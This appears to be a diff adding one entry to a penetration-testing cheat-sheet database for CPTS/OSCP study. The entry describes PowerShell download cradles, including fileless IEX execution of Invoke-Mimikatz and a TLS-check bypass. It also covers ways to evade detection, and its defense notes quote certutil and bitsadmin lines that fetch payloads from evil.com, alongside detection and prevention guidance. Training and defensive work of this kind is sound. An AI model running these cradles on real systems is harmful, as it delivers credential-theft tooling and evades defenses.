@@ -1,0 +1,116 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "powershell"
+  ],
+  "tags": [
+    "windows",
+    "download",
+    "powershell",
+    "fileless"
+  ],
+  "category": "File Transfers",
+  "subcategory": "Windows Transfer",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 07: File Transfers",
+  "examples": [
+    {
+      "label": "Fileless download and execute in memory",
+      "command": "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-Mimikatz.ps1')"
+    }
+  ],
+  "notes": "Ignore TLS cert errors: [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}",
+  "references": [
+    {
+      "title": "Microsoft - Invoke-WebRequest",
+      "url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest"
+    },
+    {
+      "title": "HTB Academy - File Transfers",
+      "url": "https://academy.hackthebox.com/module/details/24"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "win-smb-transfer",
+      "rel": "alternative",
+      "note": "SMB via impacket-smbserver."
+    },
+    {
+      "id": "lolbins-transfer",
+      "rel": "alternative",
+      "note": "LOLBins evade AppLocker/AV."
+    },
+    {
+      "id": "windows-cred-locations",
+      "rel": "next",
+      "note": "Hunt Windows credential stores."
+    }
+  ],
+  "id": "win-ps-download",
+  "name": "Windows - PowerShell Download",
+  "command": "(New-Object Net.WebClient).DownloadFile('<url>','C:\\Users\\Public\\out.ps1')",
+  "description": "Download files on Windows with PowerShell's WebClient or Invoke-WebRequest, or run scripts fileless straight from memory with DownloadString | IEX (no disk write, evades some AV).",
+  "variations": [
+    {
+      "label": "WebClient DownloadFile",
+      "command": "(New-Object Net.WebClient).DownloadFile('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')"
+    },
+    {
+      "label": "WebClient async",
+      "command": "(New-Object Net.WebClient).DownloadFileAsync('https://<ip>/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerViewAsync.ps1')"
+    },
+    {
+      "label": "Invoke-WebRequest -OutFile",
+      "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1"
+    },
+    {
+      "label": "Fileless (DownloadString | IEX)",
+      "command": "IEX (New-Object Net.WebClient).DownloadString('https://<ip>/Invoke-Mimikatz.ps1')\n# or: (New-Object Net.WebClient).DownloadString('https://<ip>/x.ps1') | IEX"
+    },
+    {
+      "label": "Fileless via IWR",
+      "command": "Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX"
+    },
+    {
+      "label": "SSL bypass (self-signed cert)",
+      "command": "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\nInvoke-WebRequest https://<ip>/PowerView.ps1 -OutFile PowerView.ps1"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1105"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "PowerShell's Invoke-WebRequest / IEX download cradle pulls a file (or runs it in memory) from an attacker HTTP(S) server. PowerShell is a trusted, default interpreter, so the method often is not blocked outright.",
+    "prerequisites": "Code execution on a Windows target with PowerShell available and network egress to the attacker host.",
+    "impact": "Attacker tooling delivered to the target - or executed straight in memory via IEX (no disk artifact) - enabling privesc or lateral movement.",
+    "detection": "The request carries PowerShell's default User-Agent (Mozilla/5.0 ... WindowsPowerShell/5.1...); Event 4688 / Sysmon 1 logs the cradle command line and script-block logging (4104) captures IEX. Detections (HTB M07): command-line deny-listing, User-Agent analysis, SIEM correlation.",
+    "artifacts": "The downloaded file on disk (or in-memory execution with no file); the WindowsPowerShell UA in web/proxy logs; 4104 script-block entries; an outbound HTTP connection from powershell.exe.",
+    "prevention": "[MITRE T1105 M1037 Filter Network Traffic] Use web content filtering to block risky file types (.exe) and whitelist domains (the module scenario shows GitHub/Dropbox/Drive blocked); [M1031 Network Intrusion Prevention] inspect and block transfers at IDS/IPS. Apply application control (WDAC/AppLocker) to block download cradles/LOLBins, and AV/EDR to catch known tooling.",
+    "evasion": "Run IEX in memory to avoid a disk artifact; set a browser User-Agent (-UserAgent) to defeat UA analysis; use HTTPS and an allowed domain to blend with normal web traffic.",
+    "sources": [
+      "HTB M07",
+      "MITRE T1105"
+    ],
+    "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
+    "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering — block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+  }
+}
